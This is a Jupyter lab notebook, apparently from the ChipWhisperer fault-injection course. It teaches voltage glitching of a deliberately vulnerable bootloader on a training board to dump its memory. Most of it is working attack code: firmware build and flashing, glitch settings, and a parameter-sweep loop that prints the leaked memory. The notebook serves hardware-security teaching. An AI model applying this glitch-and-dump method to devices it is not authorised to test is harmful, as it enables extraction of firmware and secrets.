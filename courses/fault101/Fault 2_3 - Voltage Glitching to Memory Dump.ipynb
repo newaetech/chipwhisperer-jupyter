{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Part 2, Topic 3: Voltage Glitching to Dump Memory (MAIN)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SUMMARY:** *In the previous labs, we learned how voltage glitching can be used for a similar function as clock glitching. We also learned about how it has fewer limitations, but can be less reliable for certain target setups. It also changes a great deal based on the properties of the glitch circuit itself - even changing a wire can have a huge effect.*\n",
    "\n",
    "*In this lab, we'll use what we learned in the last lab to again attack the vulnerable serial printing of the bootloader*\n",
    "\n",
    "**LEARNING OUTCOMES:**\n",
    "\n",
    "* Applying previous glitch settings to new firmware\n",
    "* Checking for success and failure when glitching\n",
    "* Understanding how compiler optimizations can cause devices to behave in strange ways"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Situation\n",
    "\n",
    "You should already know the situation from your previous attempts at glitching this bootloader (as well as what the flaw is). No need to do big long searches for parameters, just use values that worked well for the previous tutorial."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEARM'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash -s \"$PLATFORM\"\n",
    "cd ../../../hardware/victims/firmware/bootloader-glitch\n",
    "make PLATFORM=$1 CRYPTO_TARGET=NONE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"../../Setup_Scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "fw_path = \"../../../hardware/victims/firmware/bootloader-glitch/bootloader-{}.hex\".format(PLATFORM)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "cw.program_target(scope, prog, fw_path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.clock.adc_src = \"clkgen_x1\"\n",
    "\n",
    "if PLATFORM == \"CWLITEXMEGA\":\n",
    "    scope.clock.clkgen_freq = 32E6\n",
    "    target.baud = 38400*32/7.37\n",
    "    def reboot_flush():            \n",
    "        scope.io.pdic = False\n",
    "        time.sleep(0.05)\n",
    "        scope.io.pdic = \"high_z\"\n",
    "        time.sleep(0.05)\n",
    "        #Flush garbage too\n",
    "        target.flush()\n",
    "else:\n",
    "    scope.clock.clkgen_freq = 24E6\n",
    "    target.baud = 38400*24/7.37\n",
    "    def reboot_flush():            \n",
    "        scope.io.nrst = False\n",
    "        time.sleep(0.05)\n",
    "        scope.io.nrst = True\n",
    "        time.sleep(0.05)\n",
    "        #Flush garbage too\n",
    "        target.flush()\n",
    "\n",
    "reboot_flush()\n",
    "scope.arm()\n",
    "target.write(\"p516261276720736265747267206762206f686c207a76797821\\n\")\n",
    "ret = scope.capture()\n",
    "        \n",
    "trig_len = scope.adc.trig_count"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "glitch_spots = []\n",
    "glitch_spots.extend([i for i in range(17008, 17011, 1)])\n",
    "#Basic setup\n",
    "if scope._is_husky:\n",
    "    scope.glitch.enabled = True\n",
    "scope.glitch.clk_src = \"clkgen\" # set glitch input clock\n",
    "scope.glitch.output = \"glitch_only\" # glitch_out = clk ^ glitch\n",
    "scope.glitch.trigger_src = \"ext_single\" # glitch only after scope.arm() called"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import chipwhisperer.common.results.glitch as glitch\n",
    "      \n",
    "gc = glitch.GlitchController(groups=[\"success\", \"reset\", \"normal\"], parameters=[\"width\", \"offset\"])\n",
    "gc.display_stats()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now the rest is up to you! "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from importlib import reload\n",
    "import chipwhisperer.common.results.glitch as glitch\n",
    "from tqdm.notebook import tqdm\n",
    "import re\n",
    "import struct\n",
    "\n",
    "# put some good settings in for width, offset, and repeat\n",
    "    \n",
    "for glitch_setting in gc.glitch_values():\n",
    "    scope.glitch.offset = glitch_setting[1]\n",
    "    scope.glitch.width = glitch_setting[0]\n",
    "    for i in tqdm(glitch_spots, leave=False):\n",
    "        for _ in range(1):\n",
    "            scope.glitch.ext_offset = i\n",
    "            if scope.adc.state:\n",
    "                gc.add(\"reset\", (scope.glitch.width, scope.glitch.offset))\n",
    "                reboot_flush()\n",
    "            target.flush()\n",
    "            scope.arm()\n",
    "            target.write(\"p516261276720736265747267206762206f686c207a76797821\\n\")\n",
    "            ret = scope.capture()\n",
    "            if ret:\n",
    "                gc.add(\"reset\", (scope.glitch.width, scope.glitch.offset))\n",
    "                reboot_flush()\n",
    "            else:\n",
    "                time.sleep(0.05)\n",
    "                output = target.read(timeout=2)\n",
    "                if \"767\" in output:\n",
    "                    print(\"Glitched!\\n\\tExt offset: {}\\n\\tOffset: {}\\n\\tWidth: {}\".format(i, scope.glitch.offset, scope.glitch.width))\n",
    "                    gc.add(\"success\", (scope.glitch.width, scope.glitch.offset))\n",
    "                    broken = True \n",
    "                    for __ in range(500):\n",
    "                        num_char = target.in_waiting()\n",
    "                        if num_char:\n",
    "                            my_print(output)\n",
    "                            output = target.read(timeout=50)\n",
    "                    time.sleep(1)\n",
    "                    break\n",
    "                elif \"r0\" not in output:\n",
    "                    gc.add(\"reset\", (scope.glitch.width, scope.glitch.offset))\n",
    "                else: #tough time detecting glitches\n",
    "                    if scope.adc.trig_count != trig_len:\n",
    "                        gc.add(\"reset\", (scope.glitch.width, scope.glitch.offset))\n",
    "                    else:\n",
    "                        gc.add(\"normal\", (scope.glitch.width, scope.glitch.offset))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
